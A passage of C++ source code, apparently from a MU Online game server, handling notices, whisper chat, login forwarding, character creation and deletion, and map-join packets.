void GCServerMsgStringSendToMap(LPSTR  szMsg, BYTE Map, BYTE type) 
{
	PMSG_NOTICE pNotice;
	pNotice.type = 0;	// 3
	pNotice.btCount = 0;	// 4
	pNotice.wDelay = 0;	// 6	
	pNotice.dwColor = 0;	// 8
	pNotice.btSpeed = 0;	// C
	
	TNotice::MakeNoticeMsg((TNotice*)&pNotice, type, szMsg);

	for ( int n = OBJ_STARTUSERINDEX ; n < OBJMAX ; n++)
	{
		if ( gObj[n].Connected == PLAYER_PLAYING )
		{
			if (( gObj[n].Type  == OBJ_USER ) && ( gObj[n].MapNumber == Map))
			{
				DataSend(n, (UCHAR*)&pNotice, pNotice.h.size);
			}
		}
	}
}

void GCServerMsgStringSendToNoMap(LPSTR  szMsg, BYTE Map, BYTE type) 
{
	PMSG_NOTICE pNotice;
	pNotice.type = 0;	// 3
	pNotice.btCount = 0;	// 4
	pNotice.wDelay = 0;	// 6	
	pNotice.dwColor = 0;	// 8
	pNotice.btSpeed = 0;	// C
	
	TNotice::MakeNoticeMsg((TNotice*)&pNotice, type, szMsg);

	for ( int n = OBJ_STARTUSERINDEX ; n < OBJMAX ; n++)
	{
		if ( gObj[n].Connected == PLAYER_PLAYING )
		{
			if (( gObj[n].Type  == OBJ_USER ) && ( gObj[n].MapNumber != Map))
			{
				DataSend(n, (UCHAR*)&pNotice, pNotice.h.size);
			}
		}
	}
}



void GCServerMsgStringSend(LPSTR  szMsg, int aIndex, BYTE type) 
{
	PMSG_NOTICE pNotice;
	pNotice.type = 0;	// 3
	pNotice.btCount = 0;	// 4
	pNotice.wDelay = 0;	// 6	
	pNotice.dwColor = 0;	// 8
	pNotice.btSpeed = 0;	// C
	
	TNotice::MakeNoticeMsg((TNotice*)&pNotice, type, szMsg);
	DataSend(aIndex, (UCHAR*)&pNotice, pNotice.h.size);
}





void GCServerMsgStringSendGuild(_GUILD_INFO_STRUCT* lpNode, LPSTR szMsg, BYTE type)
{
	if ( lpNode == NULL )
	{
		return;
	}

	for ( int n = 0; n<MAX_USER_GUILD ; n++)
	{
		if (lpNode->Use[n] > 0 && lpNode->Index[n] >= 0 )
		{
			GCServerMsgStringSend((char*)szMsg, lpNode->Index[n], type);
		}
	}
}




struct PMSG_EVENT
{
	PBMSG_HEAD h;	// C1:0B
	BYTE State;	// 3
	BYTE Event;	// 4
};


void GCEventStateSend(int aIndex, BYTE state, BYTE event)
{
	PMSG_EVENT pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x0B, sizeof(pMsg));
	pMsg.Event = event;
	pMsg.State = state;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}





void GCMapEventStateSend(int map, BYTE state, BYTE event)
{
	PMSG_EVENT pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x0B, sizeof(pMsg));
	pMsg.Event = event;
	pMsg.State = state;

	for ( int n=0; n<OBJMAX ; n++ )
	{
		if ( gObj[n].Connected == PLAYER_PLAYING && gObj[n].Type == OBJ_USER && map == gObj[n].MapNumber )
		{
			DataSend(n, (UCHAR*)&pMsg, pMsg.h.size);
		}
	}
}




void CGChatWhisperRecv(PMSG_CHATDATA_WHISPER* lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	char tid[11];
	PMSG_CHATDATA_WHISPER pWhisper;
	int len;
	LPOBJ lpObj = &gObj[aIndex];
	int index;

	if ( PacketCheckTime(lpObj) == FALSE )
	{
		return;
	}

	if ( lpObj->ChatLimitTime > 0 )
	{
		MsgOutput(lpObj->m_Index, lMsg.Get(MSGGET(4, 223)), lpObj->ChatLimitTime);
		return;
	}

	if ( (lpObj->Penalty & 2) == 2 )
	{
		return;
	}

	tid[10]=0;
	memcpy(tid, lpMsg->id, sizeof(lpMsg->id));
	index = WhisperCash.AddCash(tid);

	if ( index < 0 )
	{
		GCServerMsgSend(0, aIndex);
		return;
	}

	PHeadSetB((LPBYTE)&pWhisper, 0x02, sizeof(pWhisper));
	strcpy(pWhisper.id, gObj[aIndex].Name);
	memcpy(pWhisper.chatmsg, lpMsg->chatmsg, sizeof(lpMsg->chatmsg));
	//pWhisper.szChatMsg[MAX_CHAT_LEN-2] = 0;
	//pWhisper.chatmsg[MAX_CHAT_LEN-1] = 0;
	len = strlen(pWhisper.chatmsg);

	if ( len > 0 )
	{
		pWhisper.h.size -= sizeof(pWhisper.chatmsg);
		pWhisper.h.size += len + 1;

		/*if ( pWhisper.h.size > sizeof(pWhisper))
		{
			pWhisper.h.size = sizeof(pWhisper);
		}*/

		DataSend(index, (UCHAR*)&pWhisper, pWhisper.h.size);

		if(ReadConfig.GMLog == TRUE)
		{
			if (lpObj->AuthorityCode > 0 || gObj[index].AuthorityCode > 0)
			{
				GM_LOG.Output("[PVT][%s][%s] to [%s][%s] %s", 
					lpObj->AccountID, lpObj->Name, 
					gObj[index].AccountID, gObj[index].Name, 
					pWhisper.chatmsg);
			}
		}
		if(ReadConfig.PMLog == TRUE)
			POST_LOG.Output("[PVT][%s][%s] to [%s][%s] %s", 
					lpObj->AccountID, lpObj->Name, 
					gObj[index].AccountID, gObj[index].Name, 
					pWhisper.chatmsg);

	}
}





struct PMSG_JOINRESULT
{
	PBMSG_HEAD h;	// C1:F1
	BYTE scode;	// 3
	BYTE result;	// 4
	BYTE NumberH;	// 5
	BYTE NumberL;	// 6
	BYTE CliVersion[5];	// 7
};



void SCPJoinResultSend(int aIndex, BYTE result)
{
	PMSG_JOINRESULT pResult;

	memset(&pResult, 0, sizeof(pResult));

	pResult.h.size = sizeof(pResult);
	pResult.h.c = 0xC1;
	pResult.h.headcode = 0xF1;
	pResult.scode = 0x00;
	pResult.result = result;
	pResult.NumberH = SET_NUMBERH(aIndex);
	pResult.NumberL = SET_NUMBERL(aIndex);
	pResult.CliVersion[0] = szClientVersion[0];
	pResult.CliVersion[1] = szClientVersion[1];
	pResult.CliVersion[2] = szClientVersion[2];
	pResult.CliVersion[3] = szClientVersion[3];
	pResult.CliVersion[4] = szClientVersion[4];

	DataSend(aIndex, (unsigned char*)&pResult, pResult.h.size);
	gObj[aIndex].ConnectCheckTime = GetTickCount();
}



struct SDHP_IDPASS
{
	PBMSG_HEAD h;	// C1:01	[11::LOGIN-TEST]
	char Id[10];	// 3
	char Pass[10];	// D
	short Number;	// 18
	char IpAddress[17];	// 1A
};

void CSPJoinIdPassRequest(PMSG_IDPASS* lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	char serial[17];
	char id[11];

	if ( lpMsg->CliVersion[0] != szClientVersion[0] ||
		 lpMsg->CliVersion[1] != szClientVersion[1] ||
		 lpMsg->CliVersion[2] != szClientVersion[2] ||
		 lpMsg->CliVersion[3] != szClientVersion[3] ||
		 lpMsg->CliVersion[4] != szClientVersion[4] )
	{
		GCJoinResult(JS_BAD_CLIENT_VERSION, aIndex);
		CloseClient(aIndex);
		return;
	}

	serial[16] = 0;
	memcpy(serial, lpMsg->CliSerial, sizeof(lpMsg->CliSerial));
	id[10]=0;
#if(ISEX700>=1)
	//test test
		//lpMsg->Id[0x0]=	0x88;// 'à'	char
		//lpMsg->Id[0x1]=	0xaa;// '™'	char
		//lpMsg->Id[0x2]=	0xd8;// 'ÿ'	char
		//lpMsg->Id[0x3]=	0x88;// 'à'	char
		//lpMsg->Id[0x4]=	0xcf;// 'œ'	char
		//lpMsg->Id[0x5]=	0xab;// '´'	char
		//lpMsg->Id[0x6]=	0xfc;// '¸'	char
		//lpMsg->Id[0x7]=	0xcf;// 'œ'	char
		//lpMsg->Id[0x8]=	0xab;// '´'	char
		//lpMsg->Id[0x9]=	0xfc;// '¸'	char

		//lpMsg->Pass[0x0]=	0x88;// 'à'	char
		//lpMsg->Pass[0x1]=	0xaa;// '™'	char
		//lpMsg->Pass[0x2]=	0xd8;// 'ÿ'	char
		//lpMsg->Pass[0x3]=	0x88;// 'à'	char
		//lpMsg->Pass[0x4]=	0xcf;// 'œ'	char
		//lpMsg->Pass[0x5]=	0xab;// '´'	char
		//lpMsg->Pass[0x6]=	0xfc;// '¸'	char
		//lpMsg->Pass[0x7]=	0xcf;// 'œ'	char
		//lpMsg->Pass[0x8]=	0xab;// '´'	char
		//lpMsg->Pass[0x9]=	0xfc;// '¸'	char

#endif
	memcpy(id, lpMsg->Id, sizeof(lpMsg->Id));
	BuxConvert(id, MAX_ACCOUNT_LEN);
	
	gObj[aIndex].Vip = 0;
	gObj[aIndex].VipMoney = 0;
	gObj[aIndex].WarehouseVipCount = 0;
	gObj[aIndex].ExWarehouse = 0;
	gObj[aIndex].ExWarehouseTmp = 0;
#if (CRYSTAL_EDITION == 1)
#if (PACK_EDITION>=3)
	gObj[aIndex].VipShopOpen = 0;
#endif
	gObj[aIndex].MuTabOpen = 0;
#endif
	gObj[aIndex].VipDays = 0;
	gObj[aIndex].AccountExtraInfoReceived = 0;
	gObj[aIndex].LotteryCnt = 0;

#if(ENABLE_CSHOP == 1)
	gObj[aIndex].CShopInfoRequested = 0;
	gObj[aIndex].CShopInfoModified_Normal = 0;
	gObj[aIndex].CShopInfoModified_Gift = 0;
	gObj[aIndex].CShopInfoModified_Points = 0;
	gObj[aIndex].GoblinCoin = 0;
	gObj[aIndex].WCoin = 0;
	gObj[aIndex].WCoinP = 0;
	gObj[aIndex].CShop = new MUITEMSHOP[MUITEMSHOP_MAXITEMPERPAGE*MUITEMSHOP_MAXPAGES];
	gObj[aIndex].CShopGift = new MUITEMSHOP[MUITEMSHOP_MAXITEMPERPAGE*MUITEMSHOP_MAXPAGES];
	gObj[aIndex].CShopGiftMsg = new MUITEMSHOPGIFT[MUITEMSHOP_MAXITEMPERPAGE*MUITEMSHOP_MAXPAGES];
#endif

	if ( strcmp(serial, szGameServerExeSerial) != 0 )
	{
		LogAddC(2, "error-L1: Serial error [%s] [%s]", id, serial);
		GCJoinResult(JS_BAD_CLIENT_VERSION, aIndex);
		CloseClient(aIndex);
		return;
	}

	if ( bCanConnectMember == TRUE )
	{
		if ( ConMember.IsMember(id) == FALSE )
		{
			GCJoinResult(JS_ONLY_VIP_MEMBERS, aIndex);
			return;
		}
	}

	LPOBJ lpObj = &gObj[aIndex];

	if (PacketCheckTime(lpObj) == FALSE )
	{
		LogAdd(lMsg.Get(MSGGET(1, 217)), aIndex, id);
		CloseClient(aIndex);
		return;
	}

	if ( gObj[aIndex].Connected != PLAYER_CONNECTED )
	{
		LogAdd(lMsg.Get(MSGGET(1, 218)), aIndex, id);
		CloseClient(aIndex);
		return;
	}

	if ( gObj[aIndex].LoginMsgSnd != FALSE )
	{
		if ( gObj[aIndex].LoginMsgSnd == TRUE )
		{
			LogAdd(lMsg.Get(MSGGET(1, 219)), aIndex, id, gObj[aIndex].Ip_addr );
		}
		else
		{
			LogAdd("error : %d %s %d", gObj[aIndex].LoginMsgSnd, __FILE__, __LINE__);
		}

		return;
	}

	SDHP_IDPASS spMsg;

	PHeadSetB((LPBYTE)&spMsg, 0x01, sizeof(spMsg));
	spMsg.Number = aIndex;
	memcpy(spMsg.Id, lpMsg->Id, sizeof(spMsg.Id));
	memcpy(spMsg.Pass, lpMsg->Pass, sizeof(spMsg.Pass));
	strcpy(spMsg.IpAddress, gObj[aIndex].Ip_addr);
	gObj[aIndex].CheckTick = lpMsg->TickCount;
	gObj[aIndex].CheckTick2 = GetTickCount();
	gObj[aIndex].ConnectCheckTime = GetTickCount();
	gObj[aIndex].CheckSpeedHack = true;
	gObj[aIndex].ConnectCheckTime = GetTickCount();
	gObj[aIndex].LoginMsgSnd = 1;
	gObj[aIndex].LoginMsgCount++;
	gObj[aIndex].AccountID[MAX_ACCOUNT_LEN] = 0;
	memcpy(gObj[aIndex].AccountID, id, MAX_ACCOUNT_LEN);
	gObj[aIndex].m_cAccountItemBlock = 0;

	wsJServerCli.DataSend((char*)&spMsg, spMsg.h.size);
	LogAddTD("join send : (%d)%s", aIndex, gObj[aIndex].AccountID);
	lpObj->m_bMapSvrMoveReq = false;
	lpObj->m_sPrevMapSvrCode = -1; 
	lpObj->m_sDestMapNumber = -1;
	lpObj->m_btDestX = 0;
	lpObj->m_btDestY = 0;

#if (PACK_EDITION>=3)
#if (CRYSTAL_EDITION == 1)
	if(CrystalWall.SpeedMax_UseMaxLimit == 1)
	{
		struct SEND_MAXSPEED
		{
			PBMSG_HEAD h;	// C1:FC
			BYTE SubCode;
			BYTE Use_Limit;
			WORD Magic_Speed;
			WORD Phy_Speed;
		};
		SEND_MAXSPEED pMsg;
		PHeadSetB((LPBYTE)&pMsg, 0xFC, sizeof(pMsg));
		pMsg.SubCode = 0x99;

		pMsg.Use_Limit = CrystalWall.SpeedMax_UseMaxLimit;
		pMsg.Magic_Speed = CrystalWall.SpeedMax_Magic;
		pMsg.Phy_Speed = CrystalWall.SpeedMax_Physic;
		DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
	}
	CrystalWall.SendCRC(aIndex);
#endif
#endif
}








	
void CSPJoinIdPassRequestTEST(PMSG_IDPASS * lpMsg, int aIndex)
{
	char szId[11];
	char szPass[11];

	SDHP_IDPASS spMsg;

	PHeadSetB((LPBYTE)&spMsg, 0x11, sizeof(spMsg));
	spMsg.Number = aIndex;
	wsprintf(szId, "Ω∏µπ¿Ã%d", logincounttest);
	wsprintf(szPass, "m321", rand()%9);
	LogAdd("login send : %s %s", szId, szPass);
	
	BuxConvert(szId, MAX_ACCOUNT_LEN);
	BuxConvert(szPass, MAX_ACCOUNT_LEN);
	memcpy(spMsg.Id, szId, MAX_ACCOUNT_LEN);
	memcpy(spMsg.Pass, szPass, MAX_ACCOUNT_LEN);
	logincounttest++;
	
	if ( (GetTickCount()-ltesttime) > 1000 )
	{
		ltesttime = GetTickCount();
		logincounttest=0;
	}

	wsJServerCli.DataSend((char*)&spMsg, spMsg.h.size);
	spMsg.h.headcode = 0x01;
	wsJServerCli.DataSend((char*)&spMsg, spMsg.h.size);
}





struct SDHP_BILLSEARCH
{
	PBMSG_HEAD h;	// C1:06
	char Id[10];	// 3
	short Number;	// E
};





void GCJoinBillCheckSend(LPSTR AccountId, int aIndex)
{
	SDHP_BILLSEARCH pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x06, sizeof(pMsg));
	memcpy(pMsg.Id, AccountId, sizeof(pMsg.Id));
	pMsg.Number = aIndex;

	wsJServerCli.DataSend((char*)&pMsg, pMsg.h.size);
}






void GCJoinResult(BYTE result, int aIndex)
{
	PMSG_RESULT  pResult;

	PHeadSubSetB((LPBYTE)&pResult, 0xF1, 0x01, sizeof(pResult));
	pResult.result = result;
	DataSend(aIndex, (UCHAR*)&pResult, pResult.h.size);
}




void GCJoinSocketResult(BYTE result, SOCKET Socket)
{
	PMSG_RESULT pResult;

	PHeadSubSetB((LPBYTE)&pResult , 0xF1, 0x01, sizeof(pResult) );
	pResult.result= result;

	wsGServer.DataSocketSend(Socket, (char*)&pResult, pResult.h.size);
}






void CGClientCloseMsg(PMSG_CLIENTCLOSE * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	switch ( lpMsg->Flag )
	{
		case 0:	// Close Game
			gObjCloseSet(aIndex, 0);

			if ( aIndex < 0 || aIndex > OBJMAX-1)
			{
				return;
			}

			LogAddTD("[UserSelClose] Go Exit [%s][%s] Map:[%d][%d/%d]",
				gObj[aIndex].AccountID, gObj[aIndex].Name,
				gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
			break;

		case 2:	// ServerList
			{
				if(ReadConfig.S5E2 == 1 && gObj[aIndex].Vip == 1
#if (PACK_EDITION>=2)
					&& VipSystem.IsVipSwitchServer == 0
#endif
					)
				{				
					GCServerMsgStringSend("You need to close Mu before switch Server!",aIndex, 0);
					gObjCloseSet(aIndex, 0);
					
					if ( aIndex < 0 || aIndex > OBJMAX-1)
					{
						return;
					}

					LogAddTD("[UserSelClose] Go Exit [%s][%s] Map:[%d][%d/%d]",
						gObj[aIndex].AccountID, gObj[aIndex].Name,
						gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
					return;
				}
				gObjCloseSet(aIndex, 2);

				if ( aIndex < 0 || aIndex > OBJMAX-1)
				{
					return;
				}

				LogAddTD("[UserSelClose] Go ServerList [%s][%s] Map:[%d][%d/%d]",
					gObj[aIndex].AccountID, gObj[aIndex].Name,
					gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
			}break;

		case 1:	// Select Character
			gObjCloseSet(aIndex, 1);

			if ( aIndex < 0 || aIndex > OBJMAX-1)
			{
				return;
			}

			LogAddTD("[UserSelClose] Go CharSelect [%s][%s] Map:[%d][%d/%d]",
				gObj[aIndex].AccountID, gObj[aIndex].Name,
				gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
			break;
	}
}






void GCCloseMsgSend(int aIndex, BYTE result)
{
	PMSG_RESULT pMsg;

	PHeadSubSetBE((LPBYTE)&pMsg, 0xF1, 0x02, sizeof(pMsg));
	pMsg.result = result;
	
	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}





void CGClientMsg(PMSG_CLIENTMSG* lpMsg, int aIndex)
{
	if ( lpMsg->Flag )
	{
		//LogAddC(2,"error-L1 : [Flag] HackCheck [%s][%s] 0x%x 0x%x",
		//	gObj[aIndex].AccountID, gObj[aIndex].Name,
		//	lpMsg->Flag, lpMsg->subFlag);
	}
	else 
	{
		//LogAddC(2, "error-L1 : [Count] HackCheck [%s][%s] 0x%x 0x%x",
		//	gObj[aIndex].AccountID, gObj[aIndex].Name,
		//	lpMsg->Flag, lpMsg->subFlag);

		/*if ( gObj[aIndex].m_ClientHackLogCount < 100 )
		{
			LogAddC(2, "error-L1 : [Count] HackCheck [%s][%s] 0x%x 0x%x",
				gObj[aIndex].AccountID, gObj[aIndex].Name,
				lpMsg->Flag, lpMsg->subFlag);
		}

		gObj[aIndex].m_ClientHackLogCount++;

		if ( gObj[aIndex].m_ClientHackLogCount >= 100 )
			gObj[aIndex].m_ClientHackLogCount = 100;*/
	}

	//char msg[255];
	//wsprintf(msg, "Client HackCheck %d", lpMsg->Flag);
	//gSendHackLog.Send(aIndex, 0, msg);
}




struct SDHP_CREATECHAR
{
	PBMSG_HEAD h;	// C1:04
	int UserNumber;	// 4
	int DBNumber;	// 8
	short Number;	// C
	char AccountId[10];	// E
	char Name[10];	// 18
	BYTE ClassSkin;	// 22
};



void CGPCharacterCreate( PMSG_CHARCREATE * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( !PacketCheckTime(&gObj[aIndex]))
	{
		JGCharacterCreateFailSend(aIndex, lpMsg->Name);
		return;
	}

	if ( gObj[aIndex].Connected < PLAYER_LOGGED )
	{
		LogAdd(lMsg.Get(MSGGET(1, 220)), aIndex, gObj[aIndex].Ip_addr);
		CloseClient(aIndex);

		return;
	}

	if ( gObj[aIndex].Connected == PLAYER_PLAYING )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[Anti-HACK][CGPCharacterCreate] Attempted Character Create during GamePlay. [%s][%s]",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
		CloseClient(aIndex);

		return;
	}


	if ( !gCreateCharacter )
	{
		GCServerMsgStringSend("º≠πˆ∫–«“ ±‚∞£ø°¥¬ ƒ≥∏Ø≈Õ∏¶ ª˝º∫«“ºˆ æ¯Ω¿¥œ¥Ÿ", aIndex, 1);
		JGCharacterCreateFailSend(aIndex, lpMsg->Name);

		return;
	}


	if ( lpMsg->ClassSkin == 0x00 || lpMsg->ClassSkin == 0x10 || lpMsg->ClassSkin == 0x20 || lpMsg->ClassSkin == 0x30 || lpMsg->ClassSkin == 0x40 || lpMsg->ClassSkin == 0x50 || lpMsg->ClassSkin == 0x60 )
	{

	}
	else
	{
		JGCharacterCreateFailSend(aIndex, lpMsg->Name);
		return;
	}

	if ( lpMsg->ClassSkin == 0x30 ) // MG
	{
		if ( (gObj[aIndex].Magumsa & 0x01) != 0x01 )
		{
			LogAddC(2, "error-L1: Magumsa Character create error [%s]", gObj[aIndex].AccountID);
			JGCharacterCreateFailSend(aIndex, lpMsg->Name);
			return;
		}
	}

	if ( lpMsg->ClassSkin == 0x40 ) // DL
	{
		if ( (gObj[aIndex].Magumsa & 0x10) != 0x10 )
		{
			LogAddC(2, "error-L1: Darklord Character create error [%s]", gObj[aIndex].AccountID);
			JGCharacterCreateFailSend(aIndex, lpMsg->Name);
			return;
		}
	}

	if ( lpMsg->ClassSkin == 0x50 ) // SU
	{
		if ( gObj[aIndex].AllowSummoner == 0 )
		{
			LogAddC(2, "error-L1: Summoner Character create error [%s]", gObj[aIndex].AccountID);
			JGCharacterCreateFailSend(aIndex, lpMsg->Name);
			return;
		}
	}

	if ( lpMsg->ClassSkin == 0x60 ) // RF
	{
		if ( gObj[aIndex].AllowRageFighter == 0 )
		{
			LogAddC(2, "error-L1: RageFighter Character create error [%s]", gObj[aIndex].AccountID);
			JGCharacterCreateFailSend(aIndex, lpMsg->Name);
			return;
		}
	}
	
	if(gObj[aIndex].CloseType == 2)
		return;

	SDHP_CREATECHAR sCreate;

	memset(&sCreate, 0, sizeof(sCreate));
	PHeadSetB((LPBYTE)&sCreate, 0x94, sizeof(sCreate));
	sCreate.ClassSkin = lpMsg->ClassSkin;
	sCreate.Number = aIndex;
	memcpy(sCreate.AccountId, gObj[aIndex].AccountID, MAX_ACCOUNT_LEN);
	memcpy(sCreate.Name, lpMsg->Name, MAX_ACCOUNT_LEN);
	char szTemp[20];
	char szTemp2[20];
	szTemp[10]=0;
	szTemp2[10]=0;
	memcpy(szTemp, sCreate.Name, MAX_ACCOUNT_LEN);
	memcpy(szTemp2, sCreate.AccountId, MAX_ACCOUNT_LEN);

	LogAddTD("Character create : %s,%s", szTemp2, szTemp);

	cDBSMng.Send((char*)&sCreate, sCreate.h.size);
}






struct SDHP_CHARDELETE
{
	PBMSG_HEAD h;	// C1:05
	short Number;	// 4
	char AccountID[10];	// 6
	char Name[10];	// 10
	BYTE Guild;	// [0:NoGuild] [1:Master] [2:Member] 1A
	char GuildName[8];	// 1B
};




void CGPCharDel(PMSG_CHARDELETE * lpMsg,int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( !PacketCheckTime(&gObj[aIndex]))
		return;

	if ( gObj[aIndex].Connected < PLAYER_LOGGED )
	{
		CloseClient(aIndex);
		return;
	}

	if ( gObj[aIndex].Connected == PLAYER_PLAYING )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[Anti-HACK][CGPCharDel] Attempted Character Delete during GamePlay. [%s][%s]",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
		CloseClient(aIndex);
		return;
	}

	if ( gObj[aIndex].bEnableDelCharacter == false )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[Anti-HACK][CGPCharDel] Attempted Character Delete during Prevented Time. [%s][%s]",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
		CloseClient(aIndex);
		return;
	}

	SDHP_CHARDELETE pCDel;
	PMSG_RESULT pResult;

	PHeadSubSetB((LPBYTE)&pResult, 0xF3, 0x02, sizeof(pResult));
	pResult.result = 0;

	if ( gObj[aIndex].m_cAccountItemBlock )
	{
		pResult.result = 3;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( !gGuildDestroy )
	{
		pResult.result = 0;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if(gObj[aIndex].CloseType == 2)
		return;

	char szJoomin[11];
	char szTemp[20];
	char szTemp2[20];

	memset(szJoomin, 0, sizeof(szJoomin));
	memcpy(szJoomin, lpMsg->LastJoominNumber, 10);

	if ( gObjJoominCheck(aIndex, szJoomin) == FALSE )
	{
		pResult.result = 2;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	PHeadSetB((LPBYTE)&pCDel, 0x95, sizeof(pCDel));
	pCDel.Number = aIndex;
	memcpy(pCDel.AccountID, gObj[aIndex].AccountID, sizeof(pCDel.AccountID));
	memcpy(pCDel.Name, lpMsg->Name, sizeof(pCDel.Name));
	pCDel.Guild = 0;

	if ( gObj[aIndex].GuildNumber > 0 && gObj[aIndex].lpGuild != NULL)
	{
		if ( !strcmp(gObj[aIndex].Name, gObj[aIndex].lpGuild->Names[0] ))
		{
			pCDel.Guild = 1;	// Master
		}
		else
		{
			pCDel.Guild = 2;	// Member
		}

		memcpy(pCDel.GuildName, gObj[aIndex].lpGuild->Name, MAX_GUILD_LEN);
	}

	JGDeletePlayerQ5Info(lpMsg->Name, gObj[aIndex].AccountID);

	g_CashItemPeriodSystem.GDReqPeriodItemDelete(&gObj[aIndex], lpMsg->Name);
	szTemp[10]=0;
	szTemp2[10]=0;
	memcpy(szTemp, pCDel.Name, MAX_ACCOUNT_LEN);
	memcpy(szTemp2, pCDel.AccountID, MAX_ACCOUNT_LEN);

	LogAddTD("Character delete : %s,%s", szTemp2, szTemp);

	cDBSMng.Send((PCHAR)&pCDel, pCDel.h.size);
	gObj[aIndex].Level = 0;
}

struct PMSG_CHARLOGIN
{
	PBMSG_HEAD h;	// C1:F3:15
	BYTE SubCode;	// 4
	char Name[10];	// 10
	BYTE Val;
};


void CGPCharacterMapJoinRequestS4( PMSG_CHARMAPJOIN * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if(gObj[aIndex].CloseType != 2)
	{
		PMSG_CHARLOGIN pMsg;
		PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x15, sizeof(pMsg));
		memcpy(pMsg.Name, lpMsg->Name, sizeof(pMsg.Name));
		pMsg.Val = 0;
		DataSend(aIndex, (BYTE*)&pMsg,sizeof(pMsg));
	}
	//unsigned char SendData[1024] = {0};
	//SendData[0] = 0xC1;
	//SendData[1] = 0x0F;
	//SendData[2] = 0xF3;
	//SendData[3] = 0x15;
	//DataSend(aIndex, SendData, 0x0F);
	//Sleep(1000);	//SLEEP NEED TO REMOVE IT BUT FOR NOW WORKS

	//if ( !PacketCheckTime(&gObj[aIndex]))
	//{
	//	//JGCharacterCreateFailSend(aIndex, lpMsg->Name);
	//	return;
	//}

	//if ( !gObjIsAccontConnect(aIndex, gObj[aIndex].AccountID))
	//	return;

	//if ( gObj[aIndex].Connected == PLAYER_PLAYING )
	//	return;

	//gObj[aIndex].bEnableDelCharacter = false;


	//char _name[MAX_ACCOUNT_LEN+1];
	//SDHP_DBCHARINFOREQUEST pCRequest;

	//PHeadSetB((LPBYTE)&pCRequest, 0x06, sizeof(pCRequest));
	//memset(_name, 0, MAX_ACCOUNT_LEN);
	//memcpy(_name, lpMsg->Name, MAX_ACCOUNT_LEN);
	//BuxConvert(_name, MAX_ACCOUNT_LEN);
	//memcpy(pCRequest.Name, _name, MAX_ACCOUNT_LEN);
	//strcpy(pCRequest.AccountID, gObj[aIndex].AccountID);
	//pCRequest.Number = aIndex;

	////GDGetMasterInfo(aIndex,gObj[aIndex].AccountID,_name);

	//cDBSMng.Send((char*)&pCRequest, pCRequest.h.size);
	
}

void CGPCharacterMapJoinRequest( PMSG_CHARMAPJOIN * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( !PacketCheckTime(&gObj[aIndex]))
	{
		//JGCharacterCreateFailSend(aIndex, lpMsg->Name);
		return;
	}

	if ( !gObjIsAccontConnect(aIndex, gObj[aIndex].AccountID))
		return;

	if ( gObj[aIndex].Connected == PLAYER_PLAYING )
	{
		return;
	}

	gObj[aIndex].bEnableDelCharacter = false;

	char _name[MAX_ACCOUNT_LEN+1];
	SDHP_DBCHARINFOREQUEST pCRequest;

	PHeadSetB((LPBYTE)&pCRequest, 0x06, sizeof(pCRequest));
	memset(_name, 0, MAX_ACCOUNT_LEN);
	memcpy(_name, lpMsg->Name, MAX_ACCOUNT_LEN);
	BuxConvert(_name, MAX_ACCOUNT_LEN);
	memcpy(pCRequest.Name, _name, MAX_ACCOUNT_LEN);
	strcpy(pCRequest.AccountID, gObj[aIndex].AccountID);
	pCRequest.Number = aIndex;

	//GDGetMasterInfo(aIndex,gObj[aIndex].AccountID,_name);
#if (TOEXDB == 0)
	cDBSMng.Send((char*)&pCRequest, pCRequest.h.size);
#else
	wsSCFExDbCli.DataSend((char*)&pCRequest,pCRequest.h.size);
#endif
	
}



struct PMSG_LEVELUP
{
	PBMSG_HEAD h;	// C1:F3:05
	BYTE subcode;	// 3
	WORD Level;	// 4
	WORD LevelUpPoint;	// 6
	WORD MaxLife;	// 8
	WORD MaxMana;	// A
	WORD wMaxShield;	// C
	WORD MaxBP;	// E
	short AddPoint;	// 10
	short MaxAddPoint;	// 12
	short MinusPoint;	// 14
	short MaxMinusPoint;	// 16
};



void GCLevelUpMsgSend(int aIndex, int iSendEffect)
{
	if ( !OBJMAX_RANGE(aIndex))
		return;

	short AddPoint=0;
	short MaxAddPoint=0;
	short MinusPoint=0;
	short MaxMinusPoint=0;

	gObjGetStatPointState(gObj[aIndex].m_Index, AddPoint, MaxAddPoint, MinusPoint, MaxMinusPoint);
	
	PMSG_LEVELUP pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x05, sizeof(pMsg));
	pMsg.Level = gObj[aIndex].Level;
	pMsg.LevelUpPoint = gObj[aIndex].LevelUpPoint;
	pMsg.MaxLife = ((float)gObj[aIndex].MaxLife+(float)gObj[aIndex].AddLife);
	pMsg.MaxMana = ( (float)gObj[aIndex].MaxMana+(float)gObj[aIndex].AddMana);
